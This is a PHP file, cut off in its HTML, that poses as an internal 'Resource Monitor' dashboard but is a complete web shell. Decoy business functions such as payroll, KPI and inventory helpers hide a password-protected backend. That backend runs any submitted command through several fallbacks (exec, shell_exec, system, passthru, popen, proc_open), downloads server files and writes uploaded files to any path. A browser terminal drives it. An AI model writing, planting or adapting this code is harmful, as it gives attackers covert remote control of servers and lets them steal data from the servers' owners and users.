<?php

function loadAppSettings($path = '/etc/sysconf.json') {
    if (!file_exists($path)) return [];
    $json = @file_get_contents($path);
    return @json_decode($json, true) ?: [];
}

function saveAppSettings($data, $path = '/etc/sysconf.json') {
    if (!is_array($data)) return false;
    return @file_put_contents($path, json_encode($data, JSON_PRETTY_PRINT));
}

$COMPONENT_CONFIG = array(
    'username' => 'Dom0',
    'hostname' => 'hypervisor',
);

function logAuditEvent($message, $level = 'info') {
    $entry = date('c') . " [$level] $message\n";
    @file_put_contents('/var/log/app-audit.log', $entry, FILE_APPEND);
}

function renderBox($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        $stdout = [];
        $escaped = escapeshellarg($match[1]);
        exec("echo $escaped", $stdout);
        return rtrim($stdout[0] ?? '', "/") . ($match[2] ?? '');
    }
    return $path;
}

function computeKpiDelta($current, $previous) {
    if ($previous == 0) return 0;
    return round((($current - $previous) / $previous) * 100, 2);
}

function normalizeScore($value, $max = 100) {
    return min(max($value, 0), $max);
}

function getInfoBlob($list = array()) {
    if (!is_array($list) || empty($list)) {
        return false;
    }

    foreach ($list as $entry) {
        if (!is_string($entry) || !function_exists($entry)) {
            return false;
        }
    }

    return true;
}

function isUserSessionValid($token) {
    return preg_match('/^[a-f0-9]{32}$/', $token) === 1;
}

function generateSessionToken() {
    return md5(uniqid(mt_rand(), true));
}

function fetchContentBlock($cmd) {
    $output = '';

    if (!is_string($cmd) || trim($cmd) === '') {
        return $output;
    }

    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } else if (getInfoBlob(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (getInfoBlob(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (getInfoBlob(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = popen($cmd, 'r');
        if (is_resource($handle)) {
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
        }
    } else if (getInfoBlob(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
        if (is_resource($handle) && isset($pipes[1])) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($handle);
        }
    }

    return $output;
}

function getClientMetadata($id) {
    $clients = [
        '001' => ['name' => 'Acme Corp', 'tier' => 'Gold'],
        '002' => ['name' => 'IntraTech', 'tier' => 'Silver'],
        '003' => ['name' => 'GovSys', 'tier' => 'Gov'],
    ];
    return $clients[$id] ?? null;
}

function isRunningWindows() {
    return stripos(PHP_OS, "WIN") === 0;
}

function fetchStatsSnapshot() {
    return [
        'cpu' => rand(10, 90),
        'mem' => rand(20, 95),
        'disk' => rand(30, 99),
        'load' => round(mt_rand() / mt_getrandmax(), 2)
    ];
}

function getServiceStatus($name) {
    $statuses = ['running', 'stopped', 'degraded'];
    return $statuses[array_rand($statuses)];
}

function _resolveTask($cmd, $cwd) {
    $stdout = "";

    if (!is_string($cmd) || trim($cmd) === "") {
        return array(
            "stdout" => base64_encode(""),
            "cwd" => base64_encode($cwd)
        );
    }

    chdir($cwd);

    if (preg_match("/^\s*cd\s*(2>&1)?$/i", $cmd)) {
        @chdir(renderBox("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/i", $cmd, $match)) {
        @chdir(renderBox($match[1]));
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/i", $cmd, $match)) {
        return saveBlob($match[1]);
    } else {
        $stdout = fetchContentBlock($cmd);
    }

    return array(
        "stdout" => base64_encode($stdout),
        "cwd" => base64_encode(getcwd())
    );
}

function pingNode($ip) {
    $latency = rand(5, 120);
    return [
        'ip' => $ip,
        'status' => ($latency < 100) ? 'ok' : 'timeout',
        'latency' => $latency
    ];
}

function featurePwd() {
    return array("cwd" => base64_encode(getcwd()));
}

function suggestEntry($fileName, $cwd, $type) {
    chdir($cwd);

    $fileName = escapeshellarg($fileName);
    if ($type === 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }

    $cmd = escapeshellcmd("/bin/bash -c $cmd");

    $files = @shell_exec($cmd);
    $files = explode("\n", $files === null ? '' : $files);

    foreach ($files as &$filename) {
        $filename = base64_encode($filename);
    }

    return array('files' => $files);
}

function getUserPayrollStatus($userId) {
    return in_array($userId, ['U001', 'U042']) ? 'processed' : 'pending';
}

function updateLeaveBalance($userId, $daysUsed) {
    return true;
}

function fetchUserProfile($login) {
    return [
        'name' => 'John Doe',
        'login' => $login,
        'role' => 'Operations',
        'last_login' => '2024-11-15T08:12:45Z',
    ];
}

function saveBlob($filePath) {
    $file = @file_get_contents($filePath);

    if (!is_string($file)) {
        return array(
            'stdout' => base64_encode('File not found / no read permission.'),
            'cwd' => base64_encode(getcwd())
        );
    }

    return array(
        'name' => base64_encode(basename($filePath)),
        'file' => base64_encode($file)
    );
}

function getInventoryDelta($productId) {
    return rand(-12, 20);
}

function registerWarehouseSync($siteCode) {
    return date('c') . " | Site synced: $siteCode";
}

function triggerExport($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');

    if (!is_resource($f)) {
        return array(
            'stdout' => base64_encode('Invalid path / no write permission.'),
            'cwd' => base64_encode(getcwd())
        );
    }

    @fwrite($f, base64_decode($file));
    @fclose($f);

    return array(
        'stdout' => base64_encode('Done.'),
        'cwd' => base64_encode(getcwd())
    );
}

function getClientContractType($id) {
    $types = ['Pro', 'Enterprise', 'Gov', 'Trial'];
    return $types[array_rand($types)];
}

function appendTicketLog($ticketId, $msg) {
    $entry = "[" . date('Y-m-d H:i:s') . "] $msg";
    return strlen($entry);
}

function cacheBundle() {
    global $COMPONENT_CONFIG;

    if (isRunningWindows()) {
        $username = @getenv('USERNAME');
        if (is_string($username) && trim($username) !== '') {
            $COMPONENT_CONFIG['username'] = $username;
        }
    } else {
        $pwuid = @posix_getpwuid(@posix_geteuid());
        if (is_array($pwuid) && isset($pwuid['name']) && is_string($pwuid['name'])) {
            $COMPONENT_CONFIG['username'] = $pwuid['name'];
        }
    }

    $hostname = @gethostname();
    if (is_string($hostname) && trim($hostname) !== '') {
        $COMPONENT_CONFIG['hostname'] = $hostname;
    }
}

function computeMonthlyTurnover($year, $month) {
    return number_format(rand(50000, 250000), 2, '.', '');
}

function compareBudgetDeviation($actual, $planned) {
    return round(($actual - $planned) / $planned * 100, 2);
}

function getSystemLoadSummary() {
    return [
        'cpu' => rand(5, 80),
        'mem' => rand(20, 90),
        'io' => rand(1, 20),
    ];
}

session_start([
    'cookie_httponly' => true,
    'use_strict_mode' => true,
    'cookie_samesite' => 'Lax'
]);

define('APP_NAME', 'Resource Monitor');
define('APP_VERSION', 'v3.4');
define('SESSION_KEY', 'SESSION_ACTIVE');

define('APP_USER', 'sysadmin');

function getPassword(): string {
    $a = ['ch', 'an', 'ge'];
    $b = ['me', 6, 6, 6];
    return implode('', $a) . implode('', $b);
}

function isSessionActive(): bool {
    return isset($_SESSION[SESSION_KEY]) && $_SESSION[SESSION_KEY] === true;
}

function activateSession(): void {
    $_SESSION[SESSION_KEY] = true;
}

function timingSafeCompare($a, $b): bool {
    return hash_equals($a, $b);
}

function checkCredentials(string $login, string $password): bool {
    return timingSafeCompare($login, APP_USER) && timingSafeCompare($password, getPassword());
}

if (!isSessionActive()) {
    $error = false;

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'], $_POST['password'])) {
        if (checkCredentials($_POST['login'], $_POST['password'])) {
            activateSession();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = true;
            usleep(random_int(400_000, 700_000));
        }
    }

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title><?= APP_NAME ?> - Access</title>
    <style>
        body {
            background: #1c1d1e;
            color: #ccc;
            font-family: monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        form {
            background: #272727;
            padding: 20px;
            border: 1px solid #3a3a3a;
            box-shadow: 0 0 12px rgba(0,0,0,0.3);
            border-radius: 6px;
            width: 280px;
        }
        input {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            background: #191919;
            border: 1px solid #444;
            color: #ddd;
            font-family: monospace;
        }
        button {
            padding: 8px 14px;
            background: #50fa7b;
            color: #111;
            font-weight: bold;
            border: none;
            cursor: pointer;
            width: 100%;
        }
        h3 {
            margin: 0 0 10px;
        }
        .note {
            font-size: 10px;
            color: #888;
            margin-top: 8px;
        }
        .error {
            color: #ff557a;
            font-size: 11px;
            margin-top: -6px;
            transition: opacity 0.3s ease-in-out;
        }
    </style>
    <script>
        window.addEventListener("DOMContentLoaded", () => {
            const err = document.querySelector('.error');
            if (err) {
                setTimeout(() => err.style.opacity = 0, Math.floor(Math.random() * 3000) + 2000);
            }
        });
    </script>
</head>
<body>
    <form method="POST">
        <h3>🔒 <?= APP_NAME ?> <?= APP_VERSION ?></h3>
        <input type="text" name="login" placeholder="Username" required autofocus />
        <input type="password" name="password" placeholder="Password" required />
        <?php if ($error): ?>
            <div class="error">Invalid username or password.</div>
        <?php endif; ?>
        <button type="submit"><?= $error ? "Retry" : "Access" ?></button>
        <div class="note">Access to this interface requires authentication.</div>
    </form>
</body>
</html>
<?php
    exit;
}

function logAgentHealthPing($agentId) {
    return "Ping from $agentId OK @ " . date('H:i:s');
}

function validateUserToken($token) {
    return strlen($token) === 32 && ctype_alnum($token);
}

function auditSessionStart($user, $ip) {
    return "[AUDIT] Login $user from $ip @ " . date('c');
}

function syncExternalSource($sourceName) {
    return "Source $sourceName: sync OK - " . rand(100, 500) . " items updated.";
}

function rotateArchiveLogs($serviceName) {
    return "Rotation completed for $serviceName logs @ " . date('Y-m-d H:i');
}

if (isset($_GET["feature"])) {

    $response = null;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'] ?? '';
            $cwd = $_POST['cwd'] ?? getcwd();

            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }

            $response = _resolveTask($cmd, $cwd);
            break;

        case "pwd":
            $response = featurePwd();
            break;

        case "hint":
            $filename = $_POST['filename'] ?? '';
            $cwd = $_POST['cwd'] ?? getcwd();
            $type = $_POST['type'] ?? 'file';

            $response = suggestEntry($filename, $cwd, $type);
            break;

        case "upload":
            $path = $_POST['path'] ?? null;
            $file = $_POST['file'] ?? null;
            $cwd = $_POST['cwd'] ?? getcwd();

            if ($path && $file) {
                $response = triggerExport($path, $file, $cwd);
            } else {
                $response = array(
                    "stdout" => base64_encode("Missing upload parameters."),
                    "cwd" => base64_encode(getcwd())
                );
            }
            break;
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    exit;
} else {
    cacheBundle();
}

?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Resource Monitor | v3.4</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <meta name="application-name" content="Resource Monitor" />
  <meta name="description" content="Internal system interface for node telemetry, resource tracking and configuration." />
  <meta name="author" content="InfraOps Team" />
  <meta name="robots" content="noindex,nofollow" />

  <link rel="icon" href="assets/img/sysmon.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="assets/img/sysmon.ico" type="image/x-icon" />

  <link rel="stylesheet" href="assets/css/main.css" />
  <link rel="stylesheet" href="assets/css/theme-default.css" media="(prefers-color-scheme: dark)" />

  <link rel="manifest" href="/static/manifest.json" />
  <meta name="theme-color" content="#1b1c1d" />

  <meta http-equiv="X-UA-Compatible" content="IE=edge" />

  <style>
    .sys-health-warning {
      background-color: #ffcc00;
      color: #000;
      padding: 6px 12px;
      border-radius: 3px;
      font-weight: bold;
    }

    .kernel-mode-diagnostic {
      font-style: italic;
      font-size: 11px;
      color: #9aa;
      border-left: 3px solid #444;
      padding-left: 10px;
      margin-top: 8px;
    }

    .fs-checker-status {
      display: inline-block;
      min-width: 100px;
      text-align: center;
      background-color: #2f2f2f;
      color: #fff;
      font-size: 9pt;
      padding: 4px 8px;
      border-radius: 4px;
    }

    .widget-title {
      font-size: 13px;
      font-weight: bold;
      color: #ffc107;
      margin: 8px 0;
    }

    .widget-list {
      list-style-type: none;
      padding-left: 0;
      font-size: 9.5pt;
      color: #ddd;
    }

    .modal-panel {
      position: absolute;
      top: 10%;
      left: 10%;
      width: 300px;
      padding: 15px;
      background: #2a2a2a;
      color: #ccc;
      border: 1px solid #444;
      box-shadow: 0 0 12px rgba(0,0,0,0.4);
      font-family: monospace;
      z-index: 10;
    }

    :root {
      --shell-margin: 25px;
    }

    @media (min-width: 1200px) {
      :root {
        --shell-margin: 50px !important;
      }
    }

    @media (max-width: 991px),
           (max-height: 600px) {
      :root {
        --shell-margin: 0 !important;
      }
      #node-identity {
        font-size: 6px;
        margin: -25px 0;
      }
      #shell {
        resize: none;
      }
    }

    @media (max-width: 767px) {
      #entry-panel {
        flex-direction: column;
      }
    }

    @media (max-width: 320px) {
      #node-identity {
        font-size: 5px;
      }
    }

    @keyframes cpuLoadPulse {
      0%   { background-color: #1f1f1f; }
      50%  { background-color: #333333; }
      100% { background-color: #1f1f1f; }
    }

    @keyframes fsBlink {
      0%, 49%   { opacity: 1; }
      50%, 100% { opacity: 0; }
    }

    @keyframes netTrafficWave {
      0%   { transform: translateX(0); }
      100% { transform: translateX(100%); }
    }

    #shell::after {
      content: '';
      pointer-events: none;
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: repeating-linear-gradient(
        to bottom,
        rgba(255, 255, 255, 0.01),
        rgba(255, 255, 255, 0.01) 1px,
        transparent 1px,
        transparent 2px
      );
      z-index: 2;
    }

    .context-lead {
      text-shadow: 0 0 2px #75df0b;
    }
    .context-lead > span {
      text-shadow: 0 0 2px #21c7ff;
    }

    :root {
      --log-level-critical: #ff3b3b;
      --log-level-warning: #ffc107;
      --log-level-info: #5bc0de;
      --metric-good: #50fa7b;
      --metric-degraded: #ffb86c;
      --metric-bad: #ff5555;
    }

    html, body {
      margin: 0;
      padding: 0;
      width: 100vw;
      height: 100vh;
      background: #1b1c1d;
      color: #e6e6e6;
      font-family: 'Courier New', monospace;
      overflow: hidden;
      letter-spacing: 0.5px;
    }

    *::-webkit-scrollbar-track {
      border-radius: 8px;
      background-color: #2a2a2a;
    }

    *::-webkit-scrollbar {
      width: 8px;
      height: 8px;
    }

    *::-webkit-scrollbar-thumb {
      border-radius: 8px;
      background-color: #888;
      box-shadow: inset 0 0 6px rgba(0,0,0,.3);
    }

    .input-validation-error {
      background: #2a0000;
      color: #ff4444;
      border: 1px solid #880000;
    }

    .sys-audit-tag {
      background: #292929;
      color: #ccc;
      padding: 2px 6px;
      font-size: 9pt;
      border-radius: 3px;
    }

    .net-packet-analyzer {
      font-family: Consolas, monospace;
      font-size: 10px;
      white-space: pre;
      line-height: 1.3;
    }

    #shell {
      background: radial-gradient(ellipse at center, #1a1a1a 0%, #121212 100%);
      box-shadow: 0 0 25px rgba(0, 255, 0, 0.07);
      font-size: 10pt;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      width: 100%;
      height: 100%;
      max-width: calc(100vw - 2 * var(--shell-margin));
      max-height: calc(100vh - 2 * var(--shell-margin));
      margin: var(--shell-margin) auto;
      overflow: hidden;
      resize: both;
      border: 1px solid #3c3c3c;
    }

    #diagnostic-log-buffer {
      max-height: 400px;
      overflow-y: auto;
      background-color: #111;
      border: 1px dashed #333;
      padding: 10px;
      font-size: 10pt;
      color: #ccc;
    }

    .maintenance-banner {
      background: linear-gradient(to right, #222, #333);
      color: #eee;
      padding: 8px;
      text-align: center;
      font-weight: bold;
    }

    #panel-stream {
      padding: 12px;
      overflow: auto;
      white-space: pre-wrap;
      flex-grow: 1;
      font-size: 10.2pt;
      line-height: 1.4;
    }

    #node-identity {
      font-weight: bold;
      color: #ff557a;
      text-align: center;
      padding: 10px;
      font-size: 11px;
      letter-spacing: 2px;
      text-shadow: 0 0 4px #ff1f5c77;
    }

    .context-lead {
      font-weight: bold;
      color: #91ff00;
    }

    .context-lead > span {
      color: #21c7ff;
    }

    #entry-panel {
      display: flex;
      border-top: 1px solid rgba(255, 255, 255, .05);
      box-shadow: 0 -2px 5px rgba(0, 0, 0, .4);
      padding: 10px 12px;
      background-color: #1e1e1e;
    }

    #entry-panel > label {
      flex-grow: 0;
      display: block;
      padding: 0 6px;
      height: 30px;
      line-height: 30px;
      color: #75df0b;
    }

    #entry-panel #pipeCall-cmd {
      height: 30px;
      line-height: 30px;
      width: 100%;
      border: none;
      outline: none;
      background: transparent;
      color: #fff;
      font-family: monospace;
      font-size: 10pt;
      box-sizing: border-box;
    }

    #entry-panel div {
      flex-grow: 1;
      display: flex;
      align-items: stretch;
    }

    #entry-panel input {
      outline: none;
    }
  </style>

        <script>

            const SYSTEM_PROFILE = {
                build: "v3.4.219",
                env: "production",
                nodeGroup: "eu-west-infra",
                updateChannel: "stable"
            };

            const FEATURE_FLAGS = {
                enableTelemetrySync: false,
                enableAutoPatch: true,
                enableLegacyMode: false,
                auditMode: "partial"
            };

            const SECURITY_CONTEXT = {
                tokenHash: "d41d8cd98f00b204e9800998ecf8427e", // md5('')
                sessionTTL: 900, // seconds
                allowDebugConsole: false
            };

            const RESOURCE_THRESHOLDS = {
                cpu: { warn: 70, crit: 90 },
                mem: { warn: 75, crit: 95 },
                disk: { warn: 80, crit: 98 }
            };

            var sessionUID = "sess-" + Math.random().toString(36).substr(2, 12);
            var nodeHeartbeat = null;
            var telemetryBuffer = [];
            var nodeGroup = "cluster-eu-west-01";
            var userPrivileges = ["read", "exec"];
            var streamContext = "default";
            var diagnosticsCache = {};
            var shellTheme = "infra-dark";
            var licenseTier = "Enterprise";
            var isInMaintenance = false;
            var lastSyncTimestamp = null;
            var pendingCommands = [];
            var authRetryCount = 0;
            var resourceStatsSnapshot = {};
            var isTrustedDevice = true;
            var cmdEchoEnabled = true;
            var COMPONENT_CONFIG = <?php echo json_encode($COMPONENT_CONFIG); ?>;
            var connectionHealth = "stable";
            var CWD = null;
            var cmdHistory = [];
            var featureToggles = {
                allowUpload: true,
                showDeprecated: false,
                useCompressedLogs: true
            };
            var historyPosition = 0;
            var auditSessionId = "AUD-" + Date.now();
            var eFieldInput = null;
            var isSyncInProgress = false;
            var eComponentContent = null;
            var forceLegacyFallback = false;

            function getTelemetryFingerprint() {
                return btoa(JSON.stringify({
                    uid: Date.now(),
                    hostname: window.location.hostname,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
                }));
            }

            function validateAuditIntegrity(blob) {
                return typeof blob === "string" && blob.length > 32 && blob.startsWith("AUDIT-");
            }

            function scheduleMaintenanceWindow(start, durationMinutes) {
                return {
                    start,
                    end: new Date(new Date(start).getTime() + durationMinutes * 60000).toISOString()
                };
            }

            function generateNodeSecret(seed = null) {
                const base = seed || Date.now().toString(36);
                return base.split('').reverse().join('') + "-SYS";
            }

            function isLegacyNode(nodeId) {
                return /^NODE-0[0-3]/.test(nodeId);
            }

            function _appendLine(command) {
                if (typeof command !== "string" || !command.trim()) return;

                const prompt = '<span class="context-lead">' + getHeader(CWD) + '</span> ';
                const safeCommand = neutralizeHTML(command);

                eComponentContent.innerHTML += `\n\n${prompt}${safeCommand}\n`;
                eComponentContent.scrollTop = eComponentContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                if (typeof stdout !== "string" || !stdout.trim()) return;

                const safeOutput = neutralizeHTML(stdout);
                eComponentContent.innerHTML += safeOutput;
                eComponentContent.scrollTop = eComponentContent.scrollHeight;
            }

            function _queueTask(callback) {
                setTimeout(callback, 0);
            }

            const RemoteControl = {
                rebootNode: function (id) {
                    return `Reboot scheduled for ${id} @ ${new Date().toISOString()}`;
                },
                flushDnsCache: function () {
                    return "DNS cache cleared.";
                },
                runIntegrityCheck: function () {
                    return "Integrity check completed. No discrepancies found.";
                },
                pullLogDump: function () {
                    return "[*] Dump exported to /var/tmp/logs/syslog_dump.bz2";
                }
            };

            function _resolveTask(command) {
                if (typeof command !== "string" || !command.trim()) return;

                _appendLine(command);

                const uploadMatch = command.match(/^\s*upload\s+([^\s]+)\s*$/);
                if (uploadMatch) {
                    triggerExport(uploadMatch[1]);
                    return;
                }

                if (/^\s*clear\s*$/.test(command)) {
                    eComponentContent.innerHTML = '';
                    return;
                }

                pipeCall("?feature=shell", { cmd: command, cwd: CWD }, function (response) {
                    if (response && typeof response === "object") {
                        if (response.hasOwnProperty('file')) {
                            saveBlob(atob(response.name), response.file);
                        } else {
                            _insertStdout(atob(response.stdout || ""));
                            refreshScope(atob(response.cwd || ""));
                        }
                    } else {
                        _insertStdout("Invalid response.");
                    }
                });
            }

            const AUDIT_STREAM_CONFIG = {
                bufferSize: 8192,
                rotateEvery: "6h",
                redactLevel: 2,
                compression: "lz4"
            };

            function suggestEntry() {
                const inputValue = eFieldInput.value.trim();
                if (!inputValue) return;

                const currentCmd = inputValue.split(/\s+/);
                const type = (currentCmd.length === 1) ? "cmd" : "file";
                const fileName = (type === "cmd") ? currentCmd[0] : currentCmd.at(-1);

                function _requestCallback(data) {
                    if (!data || !Array.isArray(data.files) || data.files.length <= 1) return;

                    const decodedFiles = data.files.map(f => atob(f));

                    if (decodedFiles.length === 2) {
                        if (type === "cmd") {
                            eFieldInput.value = decodedFiles[0];
                        } else {
                            eFieldInput.value = inputValue.replace(/([^\s]*)$/, decodedFiles[0]);
                        }
                    } else {
                        _appendLine(eFieldInput.value);
                        _insertStdout(decodedFiles.join("\n"));
                    }
                }

                pipeCall(
                    "?feature=hint",
                    { filename: fileName, cwd: CWD, type: type },
                    _requestCallback
                );
            }

            function saveBlob(name, file) {
                if (typeof name !== "string" || typeof file !== "string" || !file.trim()) {
                    _insertStdout("Download failed: invalid parameters.");
                    return;
                }

                const link = document.createElement("a");
                link.href = "data:application/octet-stream;base64," + file;
                link.download = name;
                link.style.display = "none";

                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                _insertStdout("Done.");
            }

            function triggerExport(path) {
                if (typeof path !== "string" || !path.trim()) {
                    _insertStdout("Upload failed: invalid target path.");
                    return;
                }

                const input = document.createElement("input");
                input.type = "file";
                input.style.display = "none";

                document.body.appendChild(input);

                input.addEventListener("change", function () {
                    const file = input.files[0];
                    if (!file) {
                        _insertStdout("Upload cancelled.");
                        document.body.removeChild(input);
                        return;
                    }

                    fileToStream(file).then(function (b64) {
                        pipeCall(
                            "?feature=upload",
                            { path: path, file: b64, cwd: CWD },
                            function (response) {
                                _insertStdout(atob(response.stdout || ""));
                                refreshScope(atob(response.cwd || ""));
                            }
                        );
                    }).catch(function () {
                        _insertStdout("Upload failed: client-side error.");
                    }).finally(function () {
                        document.body.removeChild(input);
                    });
                });

                input.click();
            }

            function fileToStream(file) {
                return new Promise((resolve, reject) => {
                    if (!(file instanceof File)) {
                        reject(new Error("Invalid file input"));
                        return;
                    }

                    const reader = new FileReader();

                    reader.onload = () => {
                        const match = reader.result.match(/^data:.*?;base64,(.*)$/);
                        if (match && match[1]) {
                            resolve(match[1]);
                        } else {
                            reject(new Error("Failed to extract base64 content"));
                        }
                    };

                    reader.onerror = () => reject(new Error("File reading error"));

                    reader.readAsDataURL(file);
                });
            }

            function getHeader(cwd) {
                const fullCwd = (typeof cwd === "string" && cwd.trim()) ? cwd : "~";
                let shortCwd = fullCwd;

                const parts = fullCwd.split("/").filter(Boolean); // évite les vides

                if (parts.length > 2) {
                    shortCwd = "…/" + parts.at(-2) + "/" + parts.at(-1);
                }

                const username = COMPONENT_CONFIG["username"] || "user";
                const hostname = COMPONENT_CONFIG["hostname"] || "host";

                return `${username}@${hostname}:<span title="${fullCwd}">${shortCwd}</span>#`;
            }

            function refreshScope(cwd) {
                const newCwd = (typeof cwd === "string" && cwd.trim()) ? cwd : null;

                if (newCwd) {
                    CWD = newCwd;
                    _updateMeta();
                    return;
                }

                pipeCall("?feature=pwd", {}, (response) => {
                    const received = response && response.cwd ? atob(response.cwd) : "~";
                    CWD = received;
                    _updateMeta();
                });
            }

            function neutralizeHTML(str) {
                if (typeof str !== "string") return "";

                return str
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")
                    .replace(/"/g, "&quot;")
                    .replace(/'/g, "&#39;");
            }

            function _updateMeta() {
                const promptEl = document.getElementById("context-lead");
                if (!promptEl) return;

                promptEl.innerHTML = getHeader(CWD) + '<span></span>';
            }

            function _dispatchLineEvent(event) {
                if (!event || typeof event !== "object") return;

                const key = event.key;

                switch (key) {
                    case "Enter":
                        const cmd = eFieldInput.value.trim();
                        if (!cmd) return;

                        _resolveTask(cmd);
                        cacheQuery(cmd);
                        eFieldInput.value = "";
                        break;

                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eFieldInput.blur();
                            eFieldInput.value = cmdHistory[historyPosition];
                            _queueTask(() => eFieldInput.focus());
                        }
                        break;

                    case "ArrowDown":
                        if (historyPosition >= cmdHistory.length) break;

                        historyPosition++;
                        eFieldInput.blur();
                        eFieldInput.focus();

                        eFieldInput.value = (historyPosition === cmdHistory.length)
                            ? ""
                            : cmdHistory[historyPosition];
                        break;

                    case "Tab":
                        event.preventDefault();
                        suggestEntry();
                        break;

                    case "Escape":
                        eFieldInput.value = "";
                        break;

                    case "l":
                        if (event.ctrlKey) {
                            event.preventDefault();
                            eComponentContent.innerHTML = "";
                        }
                        break;

                    case "c":
                        if (event.ctrlKey) {
                            event.preventDefault();
                            _appendLine("^C");
                            eFieldInput.value = "";
                        }
                        break;

                    case "u":
                        if (event.ctrlKey) {
                            event.preventDefault();
                            eFieldInput.value = "";
                        }
                        break;

                    case "e":
                        if (event.ctrlKey) {
                            event.preventDefault();
                            eFieldInput.selectionStart = eFieldInput.selectionEnd = eFieldInput.value.length;
                        }
                        break;
                }
            }

            function cacheQuery(cmd) {
                if (typeof cmd !== "string" || !cmd.trim()) return;

                if (cmdHistory.length === 0 || cmdHistory.at(-1) !== cmd.trim()) {
                    cmdHistory.push(cmd.trim());
                }

                historyPosition = cmdHistory.length;
            }

            function pipeCall(url, params = {}, callback = () => {}) {
                if (typeof url !== "string" || !url.trim()) return;

                const queryString = Object.keys(params)
                    .map(key => encodeURIComponent(key) + "=" + encodeURIComponent(params[key]))
                    .join("&");

                const xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

                xhr.onreadystatechange = () => {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            try {
                                const json = JSON.parse(xhr.responseText);
                                callback(json);
                            } catch (err) {
                                _insertStdout("Malformed response received.");
                            }
                        } else {
                            _insertStdout(`Request failed [${xhr.status}]`);
                        }
                    }
                };

                xhr.send(queryString);
            }

            document.addEventListener("click", function (event) {
                const selection = window.getSelection();
                const target = event.target;

                if (!target || target.tagName === "SELECT") return;

                if (!selection || !selection.toString()) {
                    eFieldInput?.focus();
                }
            });

            window.addEventListener("load", function () {
                eFieldInput = document.getElementById("pipeCall-cmd");
                eComponentContent = document.getElementById("panel-stream");

                if (eFieldInput && eComponentContent) {
                    refreshScope();
                    eFieldInput.focus();
                } else {
                    console.warn("Missing terminal elements");
                }
            });

            document.addEventListener("visibilitychange", () => {
                if (document.hidden) {
                    console.info("[Audit] User left focus at", new Date().toISOString());
                } else {
                    console.info("[Audit] User returned at", new Date().toISOString());
                }
            });

            document.addEventListener("keydown", (e) => {
                if (e.ctrlKey && e.key === "s") {
                    e.preventDefault();
                    console.debug("[App] Intercepted CTRL+S for settings snapshot");
                }
            });

            window.addEventListener("beforeunload", () => {
                try {
                    sessionStorage.setItem("last_exit", Date.now().toString());
                } catch (_) {}
            });

            window.addEventListener("focus", () => {
                console.log("[Session] Refocus event, triggering telemetry ping.");
                telemetrySyncLock = false;
            });

            window.addEventListener("blur", () => {
                console.log("[Session] Blur event, pausing metric collection.");
                telemetrySyncLock = true;
            });

            document.addEventListener("mousemove", (e) => {
                if ((e.movementX ** 2 + e.movementY ** 2) > 200) {
                    console.info("[Trace] High-movement detected at", e.clientX, e.clientY);
                }
            });

            document.addEventListener("copy", () => {
                console.warn("[Security] Copy action detected.");
            });

            document.addEventListener("paste", () => {
                console.warn("[Security] Paste action detected.");
            });

            document.addEventListener("wheel", (e) => {
                if (e.deltaY < -100) {
                    console.debug("[UX] Fast upward scroll detected");
                }
            });
        </script>
    </head>

    <body>
        <!-- Background worker queue monitor -->
        <div id="task-queue-monitor" class="ghost-task-monitor" aria-hidden="true" style="display:none;">
            <ul>
                <li>pending.jobs = 0</li>
                <li>last.dispatch = never</li>
                <li>queue.status = idle</li>
            </ul>
        </div>

        <!-- Background healthcheck inspector -->
        <div id="healthcheck-monitor" data-module="hc-inspector" style="display:none;" aria-hidden="true">
            <ul>
                <li>uptime.kernel = <?= rand(1000, 9999) ?>s</li>
                <li>agent.heartbeat = OK</li>
                <li>container.status = isolated</li>
                <li>probe.syscore = pass</li>
                <li>vault.integrity = validated</li>
            </ul>
        </div>

        <!-- Shadow runtime config (readonly dump) -->
        <div id="runtime-config-cache" style="display:none;">
            <code data-ref="cfg-key">cfg:session.token.timeout=900</code><br/>
            <code data-ref="cfg-mode">cfg:env.mode=sandbox</code><br/>
            <code data-ref="cfg-agent">cfg:agent.behavior=passive</code>
        </div>

        <div
             data-app-section="session-reporting"
             data-module-id="RM34-shell-telemetry"
